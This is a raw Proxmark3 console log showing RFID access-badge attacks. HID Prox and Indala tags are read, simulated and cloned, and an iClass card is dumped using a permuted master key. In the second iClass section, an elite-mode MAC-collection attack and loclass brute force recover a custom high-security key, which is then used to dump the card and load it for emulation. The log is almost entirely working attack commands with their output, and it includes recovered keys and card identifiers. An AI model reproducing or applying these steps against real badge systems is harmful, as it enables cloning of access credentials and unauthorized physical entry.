1.3 HID

[usb] pm3 --> lf search
[=] NOTE: some demods output possible binary          
[=] if it finds something that looks like a tag          
[=] False Positives ARE possible          
[=]           
[=] Checking for known tags...
          
[+] HID Prox TAG ID: 200600818e (16583) - Format Len: 26bit - OEM: 000 - FC: 0 - Card: 16583          
          
[+] Valid HID Prox ID found!
          
          
[+] Chipset detection : EM4x05/EM4x69 found
          
[+] Try `lf em 4x05`  commands          
[usb] pm3 --> lf hid sim 200600818e
[+] Simulating HID tag with ID 200600818e          
[+] Press pm3-button to abort simulation          
[=] You can cancel this operation by pressing the pm3 button   



2.3 Indala

[usb] pm3 --> lf search
[=] NOTE: some demods output possible binary          
[=] if it finds something that looks like a tag          
[=] False Positives ARE possible          
[=]           
[=] Checking for known tags...
          
[+] Indala Found - bitlength 64, Raw a00000009ddc4cb2          
          
[+] Possible de-scramble patterns          
[+] 	Printed     | __1822__ [0x71E]          
[+] 	Internal ID | 500976818          
          
[+] Valid Indala ID found!
          
          
[+] Chipset detection : T55xx found
          
[+] Try `lf t55xx` commands         

[usb] pm3 --> lf indala clone a00000009ddc4cb2
[=] Preparing to clone Indala 64bit tag with RawID A0 00 00 00 9D DC 4C B2 


3.3 iClass

[usb] pm3 --> hf search
[=] Checking for known tags...
          
   CSN: E9 A2 8A 00 F7 FF 12 E0           
    CC: FE FF FF FF FF FF FF FF           
	Mode: Application [Locked]          
	Coding: ISO 14443-2 B/ISO 15693          
[+] 	Crypt: Secured page, keys not locked          
[!] 	RA: Read access not enabled          
 Mem: 2 KBits/2 App Areas (31 * 8 bytes) [1F]          
	AA1: blocks 06-12          
	AA2: blocks 13-1F          
	OTP: 0xFFFF          

KeyAccess:          
	Read A - Kd or Kc          
	Read B - Kd or Kc          
	Write A - Kc          
	Write B - Kc          
	Debit  - Kd or Kc          
	Credit - Kc          
 App IA: FF FF FF FF FF FF FF FF           
[+]       : Possible iClass (legacy credential tag)          
          
[+] Valid iClass tag / PicoPass tag  found




#####
[usb] pm3 --> hf iclass permute r 3F90EBF0910F7B6F
[+] input permuted key | 3F 90 EB F0 91 0F 7B 6F  
          
[+]     unpermuted key | AF A7 85 A7 DA B3 33 78  
          
[+]                key | AE A6 84 A6 DA B2 32 78  
          
[+] holiman iclass key | AF A7 85 A7 DA B3 33 78  




[usb] pm3 --> hf iclass dump k AFA785A7DAB33378
[+] retry to select card          
.------+--+-------------------------+
          
CSN   |00| E9 A2 8A 00 F7 FF 12 E0 |
          
------+--+-------------------------+
          
      |01| 12 FF FF FF 7F 1F FF 3C | .......<
          
      |02| FE FF FF FF FF FF FF FF | ........
          
      |03| 19 CF 49 76 3A F9 0C DE | ..Iv:...
          
      |04| FF FF FF FF FF FF FF FF | ........
          
      |05| FF FF FF FF FF FF FF FF | ........
          
      |06| 03 03 03 03 00 03 E0 17 | ........
          
      |07| 50 5F 4F 4D F0 5F 9A 17 | P_OM._..
          
      |08| 2A D4 C8 21 1F 99 68 71 | *..!..hq
          
      |09| 2A D4 C8 21 1F 99 68 71 | *..!..hq
          
      |0A| FF FF FF FF FF FF FF FF | ........
          
      |0B| FF FF FF FF FF FF FF FF | ........
          
      |0C| FF FF FF FF FF FF FF FF | ........
          
      |0D| FF FF FF FF FF FF FF FF | ........
          
      |0E| FF FF FF FF FF FF FF FF | ........
          
      |0F| FF FF FF FF FF FF FF FF | ........
          
      |10| FF FF FF FF FF FF FF FF | ........
          
      |11| FF FF FF FF FF FF FF FF | ........
          
      |12| FF FF FF FF FF FF FF FF | ........
          
------+--+-------------------------+
          
[+] saving dump file - 19 blocks read          
[+] saved 152 bytes to binary file iclass_tagdump-e9a28a00f7ff12e0.bin           
[+] saved 19 blocks to text file iclass_tagdump-e9a28a00f7ff12e0.eml   



[usb] pm3 --> hf iclass eload f iclass_tagdump-e9a28a00f7ff12e0.bin
	Mode: Application [Locked]          
	Coding: ISO 14443-2 B/ISO 15693          
[+] 	Crypt: Secured page, keys not locked          
[!] 	RA: Read access not enabled          
 Mem: 2 KBits/2 App Areas (31 * 8 bytes) [1F]          
	AA1: blocks 06-12          
	AA2: blocks 13-1F          
	OTP: 0xFFFF          

KeyAccess:          
	Read A - Kd or Kc          
	Read B - Kd or Kc          
	Write A - Kc          
	Write B - Kc          
	Debit  - Kd or Kc          
	Credit - Kc          
[+] sent 152 bytes of data to device emulator memory          
[usb] pm3 --> hf iclass sim 3
#db# [-] bad 9F at 1:6          
#db# [-] bad F9 at 1:0          
#db# [-] bad AF at 5:6          
#db# [-] bad E7 at 2:2          
#db# [-] bad AF at 4:0          
#db# [-] bad AF at 1:4          
[usb] pm3 --> 






4.3 iclass


[usb] pm3 --> hf search
[=] Checking for known tags...
          
#db# [+] button pressed          
   CSN: B5 B5 25 00 F8 FF 12 E0           
    CC: FF FF FF FF E1 FF FF FF           
	Mode: Application [Locked]          
	Coding: ISO 14443-2 B/ISO 15693          
[+] 	Crypt: Secured page, keys not locked          
[!] 	RA: Read access not enabled          
 Mem: 16 KBits/16 App Areas (255 * 8 bytes) [1F]          
	AA1: blocks 06-12          
	AA2: blocks 13-FF          
	OTP: 0xFFFF          

KeyAccess:          
	Read A - Kd or Kc          
	Read B - Kd or Kc          
	Write A - Kc          
	Write B - Kc          
	Debit  - Kd or Kc          
	Credit - Kc          
 App IA: FF FF FF FF FF FF FF FF           
[+]       : Possible iClass (legacy credential tag)          
          
[+] Valid iClass tag / PicoPass tag  found






[usb] pm3 --> hf iclass sim 2
[=] Starting iCLASS sim 2 attack (elite mode)          
[=] press Enter to cancel          
#db# [+] going into attack mode, 9 CSNS sent          
#db# [-] bad 9F at 0:0          
#db# [-] bad AF at 1:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 1:0          
#db# [-] bad 3F at 0:6          
#db# [-] bad AF at 7:6          
#db# [-] bad AF at 0:4          
#db# [-] bad D7 at 1:0          
#db# [-] bad BB at 7:4          
#db# [-] bad BE at 6:2          
#db# [-] bad AF at 0:2          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:2          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 1:0          
#db# [-] bad AF at 1:6          
#db# [+] CSN: 01 .... e0 OK          
#db# [-] bad DA at 1:0          
#db# [-] bad E9 at 1:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:0          
#db# [-] bad EB at 0:0          
#db# [-] bad EB at 1:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 5:0          
#db# [-] bad FF at 0:0          
#db# [-] bad BE at 5:6          
#db# [-] bad FF at 0:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:6          
#db# [-] bad DB at 7:0          
#db# [-] bad FF at 0:0          
#db# [-] bad EB at 5:2          
#db# [-] bad EB at 6:4          
#db# [-] bad FF at 0:0          
#db# [-] bad EB at 0:0          
#db# [-] bad FF at 0:0          
#db# [-] bad EB at 2:2          
#db# [-] bad FA at 0:6          
#db# [-] bad AF at 1:4          
#db# [-] bad D7 at 1:0          
#db# [-] bad DE at 4:4          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 3:4          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 3:4          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 5:2          
#db# [-] bad EB at 0:2          
#db# [-] bad BE at 5:6          
#db# [-] bad FF at 0:2          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 0:6          
#db# [-] bad CB at 1:0          
#db# [-] bad EB at 7:2          
#db# [-] bad EB at 0:2          
#db# [-] bad AF at 0:6          
#db# [-] bad F7 at 0:0          
#db# [-] bad AF at 0:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 7:4          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 0:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad BE at 4:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:2          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:0          
#db# [-] bad B5 at 2:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 7:4          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 2:2          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 3:6          
#db# [-] bad F6 at 0:2          
#db# [-] bad AF at 8:0          
#db# [-] bad BE at 6:0          
#db# [-] bad AF at 1:4          
#db# [-] bad FF at 0:0          
#db# [-] bad EB at 3:0          
#db# [-] bad FF at 0:0          
#db# [-] bad BE at 5:6          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 6:4          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 2:0          
#db# [-] bad FF at 0:0          
#db# [-] bad DB at 7:0          
#db# [-] bad FF at 0:0          
#db# [-] bad FF at 0:0          
#db# [-] bad D7 at 0:0          
#db# [-] bad BE at 4:2          
#db# [-] bad FF at 0:0          
#db# [-] bad FF at 0:0          
#db# [-] bad ED at 2:2          
#db# [+] CSN: 0c .... e0 OK          
#db# [-] bad AF at 0:6          
#db# [-] bad BB at 0:6          
#db# [-] bad AF at 6:4          
#db# [-] bad FF at 0:0          
#db# [-] bad 3D at 1:0          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 0:6          
#db# [-] bad AF at 2:2          
#db# [-] bad AF at 0:4          
#db# [-] bad FA at 1:4          
#db# [-] bad D7 at 1:0          
#db# [-] bad FA at 1:0          
#db# [-] bad FA at 0:2          
#db# [-] bad B9 at 0:6          
#db# [-] bad BE at 6:2          
#db# [-] bad AF at 0:0          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:0          
#db# [-] bad AF at 1:2          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:6          
#db# [+] CSN: 10 .... e0 OK          
#db# [-] bad BD at 0:4          
#db# [-] bad FA at 0:0          
#db# [-] bad FA at 1:4          
#db# [-] bad AF at 3:2          
#db# [-] bad BE at 5:4          
#db# [-] bad AF at 0:4          
#db# [-] bad AD at 0:4          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 8:6          
#db# [-] bad D7 at 2:0          
#db# [-] bad FA at 3:0          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad B7 at 1:2          
#db# [-] bad EB at 5:2          
#db# [-] bad FF at 1:2          
#db# [-] bad FA at 1:4          
#db# [-] bad EE at 1:2          
#db# [-] bad FA at 5:0          
#db# [-] bad FA at 1:4          
#db# [-] bad FA at 0:0          
#db# [-] bad AF at 7:6          
#db# [-] bad 5F at 1:0          
#db# [-] bad ED at 0:0          
#db# [-] bad 7F at 0:0          
#db# [-] bad FA at 7:0          
#db# [-] bad AF at 0:0          
#db# [-] bad AF at 0:4          
#db# [-] bad F3 at 0:0          
#db# [-] bad BB at 2:0          
#db# [-] bad 6F at 6:6          
#db# [-] bad BB at 4:4          
#db# [-] bad DC at 1:0          
#db# [-] bad FA at 5:0          
#db# [-] bad FA at 4:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:4          
#db# [-] bad 3F at 2:2          
#db# [-] bad 6F at 3:6          
#db# [-] bad AF at 3:0          
#db# [-] bad EB at 2:4          
#db# [-] bad BE at 4:0          
#db# [-] bad FF at 0:0          
#db# [+] CSN: 13 .... e0 OK          
#db# [-] bad ED at 0:0          
#db# [-] bad BE at 6:0          
#db# [-] bad BE at 6:0          
#db# [-] bad EB at 8:6          
#db# [+] CSN: 07 .... e0 OK          
#db# [-] bad BD at 0:6          
#db# [-] bad BB at 5:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 0:6          
#db# [-] bad BD at 0:0          
#db# [-] bad BB at 8:2          
#db# [-] bad 7F at 0:4          
#db# [-] bad AF at 5:2          
#db# [-] bad FA at 5:6          
#db# [-] bad FF at 0:0          
#db# [-] bad BB at 0:6          
#db# [-] bad AF at 7:6          
#db# [-] bad DE at 1:6          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 1:0          
#db# [-] bad FF at 0:0          
#db# [-] bad AF at 1:4          
#db# [-] bad FF at 0:0          
#db# [-] bad FA at 0:2          
#db# [-] bad EB at 1:0          
#db# [+] CSN: 14 .... e0 OK          
#db# [-] bad D7 at 1:0          
#db# [-] bad BE at 6:6          
#db# [-] bad FA at 7:0          
#db# [-] bad AF at 2:2          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:6          
#db# [-] bad FA at 3:4          
#db# [-] bad BE at 8:4          
#db# [-] bad EB at 4:6          
#db# [-] bad FA at 0:2          
#db# [-] bad BE at 8:6          
#db# [-] bad AF at 1:2          
#db# [-] bad AF at 3:6          
#db# [-] bad BE at 0:2          
#db# [-] bad BE at 5:4          
#db# [-] bad AF at 0:0          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 3:0          
#db# [-] bad AF at 3:2          
#db# [-] bad FA at 2:0          
#db# [-] bad EB at 0:0          
#db# [-] bad FA at 0:2          
#db# [-] bad FA at 0:6          
#db# [-] bad AF at 0:6          
#db# [-] bad EB at 0:0          
#db# [-] bad AF at 2:2          
#db# [-] bad 7F at 0:6          
#db# [-] bad FA at 5:0          
#db# [-] bad DE at 1:6          
#db# [-] bad AF at 0:2          
#db# [-] bad EB at 0:0          
#db# [-] bad 9F at 1:2          
#db# [-] bad EB at 3:0          
#db# [-] bad BE at 0:2          
#db# [-] bad EB at 1:2          
#db# [-] bad AF at 3:6          
#db# [-] bad BD at 1:2          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 4:6          
#db# [-] bad AF at 0:2          
#db# [-] bad FA at 0:2          
#db# [-] bad D7 at 1:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 2:2          
#db# [-] bad AF at 4:6          
#db# [-] bad F6 at 0:2          
#db# [-] bad FA at 4:4          
#db# [-] bad B7 at 0:0          
#db# [-] bad AF at 7:2          
#db# [-] bad AF at 3:6          
#db# [-] bad AF at 2:2          
#db# [-] bad FA at 1:0          
#db# [-] bad BE at 6:0          
#db# [-] bad FC at 1:6          
#db# [-] bad FA at 4:4          
#db# [-] bad FA at 0:0          
#db# [-] bad EB at 6:6          
#db# [-] bad EB at 6:4          
#db# [-] bad DB at 4:0          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad EB at 2:2          
#db# [-] bad FF at 0:0          
#db# [-] bad BD at 1:4          
#db# [-] bad AF at 7:2          
#db# [-] bad AF at 0:2          
#db# [-] bad AF at 0:6          
#db# [-] bad D7 at 1:0          
#db# [-] bad BB at 0:4          
#db# [-] bad FC at 8:6          
#db# [-] bad AF at 4:6          
#db# [-] bad DB at 5:0          
#db# [-] bad AF at 0:2          
#db# [-] bad AF at 0:2          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 0:2          
#db# [-] bad AF at 0:0          
#db# [-] bad AF at 0:0          
#db# [-] bad 3F at 0:6          
#db# [-] bad 7E at 8:2          
#db# [-] bad 9F at 9:0          
#db# [-] bad BE at 3:4          
#db# [-] bad FA at 2:6          
#db# [-] bad FA at 0:2          
#db# [-] bad AF at 0:6          
#db# [-] bad FA at 0:2          
#db# [-] bad FA at 5:0          
#db# [-] bad AF at 0:4          
#db# [-] bad AF at 1:2          
#db# [-] bad AF at 0:6          
#db# [-] bad BB at 5:0          
#db# [-] bad FA at 2:0          
#db# [-] bad 7E at 4:2          
#db# [-] bad AF at 0:6          
#db# [-] bad BE at 5:4          
#db# [-] bad AF at 0:4          
#db# [-] bad 9F at 1:0          
#db# [-] bad FA at 1:0          
#db# [-] bad CF at 1:2          
#db# [-] bad AF at 0:2          
#db# [-] bad FF at 0:0          
#db# [-] bad DD at 1:0          
#db# [-] bad CF at 2:0          
#db# [-] bad FA at 0:2          
#db# [-] bad FA at 0:0          
#db# [-] bad FA at 0:6          
#db# [-] bad FA at 0:2          
#db# [-] bad BE at 5:6          
#db# [-] bad DB at 0:2          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 1:2          
#db# [-] bad ED at 4:0          
#db# [-] bad DD at 5:6          
#db# [-] bad AF at 3:6          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 1:2          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:2          
#db# [-] bad EB at 1:2          
#db# [-] bad BB at 2:0          
#db# [-] bad BB at 4:4          
#db# [-] bad AF at 7:2          
#db# [-] bad EB at 0:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 1:4          
#db# [-] bad AF at 0:6          
#db# [-] bad BB at 2:2          
#db# [-] bad BB at 2:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 0:6          
#db# [-] bad AF at 0:4          
#db# [-] bad D7 at 1:0          
#db# [-] bad BB at 2:0          
#db# [-] bad EE at 0:4          
#db# [-] bad FA at 0:2          
#db# [-] bad FA at 7:0          
#db# [-] bad AF at 0:4          
#db# [-] bad D7 at 1:0          
#db# [-] bad AF at 1:2          
#db# [-] bad D7 at 2:0          
#db# [+] CSN: 17 .... e0 OK          
#db# [-] bad AF at 0:6          
#db# [-] bad FA at 1:2          
#db# [-] bad FA at 1:6          
#db# [-] bad FA at 0:2          
#db# [-] bad EB at 0:0          
#db# [-] bad AF at 0:0          
#db# [-] bad EB at 6:6          
#db# [-] bad BB at 1:2          
#db# [-] bad BE at 6:0          
#db# [-] bad AF at 0:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad FA at 7:0          
#db# [-] bad D7 at 1:0          
#db# [+] CSN: ce .... e0 OK          
#db# [-] bad FA at 0:6          
#db# [-] bad D7 at 1:0          
#db# [-] bad D7 at 1:0          
#db# [-] bad EB at 0:6          
#db# [-] bad AF at 0:2          
#db# [-] bad BE at 3:2          
#db# [-] bad FA at 5:6          
#db# [-] bad BE at 5:4          
#db# [-] bad BB at 0:0          
#db# [-] bad FA at 0:6          
#db# [-] bad AF at 0:2          
#db# [-] bad BE at 4:4          
#db# [-] bad FA at 2:2          
#db# [+] CSN: d2 .... e0 OK          
[+] 9 out of 9 MAC obtained [OK]          
[+] saved 216 bytes to binary file iclass_mac_attack-2.bin  





[usb] pm3 --> hf iclass loclass f iclass_mac_attack-2.bin 
----------------------------          
[=] Bruteforcing byte 1          
[=] Bruteforcing byte 0          
[=] Bruteforcing byte 69          
  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16,
 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32,
 33, 34, 35, 36, 37, 38, 39, 40, 41,
[=] 1: 0x4c          
[=] 0: 0xb8          
[=] 69: 0x29          
----------------------------          
[=] Bruteforcing byte 2          
[=] Bruteforcing byte 4          

[=] 2: 0x9b          
[=] 4: 0x58          
----------------------------          
[=] Bruteforcing byte 5          
[=] Bruteforcing byte 13          

[=] 5: 0x7b          
[=] 13: 0x3c          
----------------------------          
[=] Bruteforcing byte 6          
[=] Bruteforcing byte 14          

[=] 6: 0x6d          
[=] 14: 0x14          
----------------------------          
[=] Bruteforcing byte 7          
[=] Bruteforcing byte 3          

[=] 7: 0x1d          
[=] 3: 0x3d          
----------------------------          
[=] Bruteforcing byte 10          
[=] Bruteforcing byte 12          

[=] 10: 0xa4          
[=] 12: 0x6c          
----------------------------          
[=] Bruteforcing byte 15          
[=] Bruteforcing byte 11          

[=] 15: 0xa2          
[=] 11: 0xd9          
----------------------------          

[=] 9: 0x8d          
----------------------------          

[=] 8: 0x35          
[+] time: 10 seconds          

          
[+] -- High security custom key (Kcus) --          
[+] Standard format    = 3016bfa6d0179112          
[+] iClass format      = 5c100df7042eae64          

          
[+] Key verified ok!



[usb] pm3 --> hf iclass dump k 5c100df7042eae64 e
.------+--+-------------------------+
          
CSN   |00| B5 B5 25 00 F8 FF 12 E0 |
          
------+--+-------------------------+
          
      |01| 12 FF FF FF E9 1F FF 3C | .......<
          
      |02| FF FF FF FF E1 FF FF FF | ........
          
      |03| A6 CF 51 B4 4D 3A 5E 5B | ..Q.M:^[
          
      |04| FF FF FF FF FF FF FF FF | ........
          
      |05| FF FF FF FF FF FF FF FF | ........
          
      |06| 00 00 00 00 00 00 E0 14 | ........
          
      |07| 00 00 00 20 01 D1 8A 7C | ... ...|
          
      |08| 00 00 00 00 00 00 00 00 | ........
          
      |09| 00 00 00 00 00 00 00 00 | ........
          
      |0A| 20 20 20 20 20 20 20 20 |         
          
      |0B| 20 20 20 20 20 20 20 20 |         
          
      |0C| 20 20 20 20 20 20 20 20 |         
          
      |0D| 20 20 20 20 20 20 20 20 |         
          
      |0E| 20 20 20 20 20 20 20 20 |         
          
      |0F| 20 20 20 20 20 20 20 20 |         
          
      |10| 20 20 20 20 20 20 20 20 |         
          
      |11| 20 20 20 20 20 20 20 20 |         
          
      |12| 20 20 20 20 20 20 20 20 |         
          
------+--+-------------------------+
          
[+] saving dump file - 19 blocks read          
[+] saved 152 bytes to binary file iclass_tagdump-b5b52500f8ff12e0.bin           
[+] saved 19 blocks to text file iclass_tagdump-b5b52500f8ff12e0.eml 


hf iclass eload iclass_tagdump-b5b52500f8ff12e0.bin
